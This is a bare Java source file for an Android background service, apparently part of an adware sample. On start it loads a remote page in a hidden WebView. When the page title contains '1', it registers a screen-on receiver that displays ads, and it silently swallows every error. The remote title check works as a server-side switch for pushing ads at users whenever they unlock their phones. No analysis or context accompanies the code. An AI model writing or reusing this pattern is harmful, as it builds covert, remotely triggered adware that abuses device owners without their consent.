package com.fsoc131y.wirex.service;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.IBinder;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.fsoc131y.wirex.receiver.DisplayAdReceiver;

public class AdService extends Service {
  WebView webView;

  public void enableScreenOnReceiver() {
    try {
      webView = new WebView(this);
      webView.loadUrl("http://w1.startapp.store/");
      webView.setWebViewClient(new WebViewClient() {
        public void onPageFinished(WebView webView, String str) {
          try {
            if (AdService.this.webView.getTitle() != null && AdService.this.webView.getTitle()
                .contains("1")) {
              IntentFilter intentFilter = new IntentFilter("android.intent.action.SCREEN_ON");
              intentFilter.addAction("android.intent.action.SCREEN_ON");
              registerReceiver(new DisplayAdReceiver(), intentFilter);
            }
          } catch (Exception e) {
          }
        }
      });
    } catch (Exception e) {
    }
  }

  public IBinder onBind(Intent intent) {
    return null;
  }

  public void onCreate() {
    super.onCreate();
    try {
      new Handler().postDelayed(new Runnable() {
        public void run() {
          try {
            enableScreenOnReceiver();
          } catch (Exception e) {
          }
        }
      }, 2);
    } catch (Exception e) {
    }
  }

  public void onDestroy() {
    try {
      webView.destroy();
      super.onDestroy();
    } catch (Exception e) {
    }
  }
}
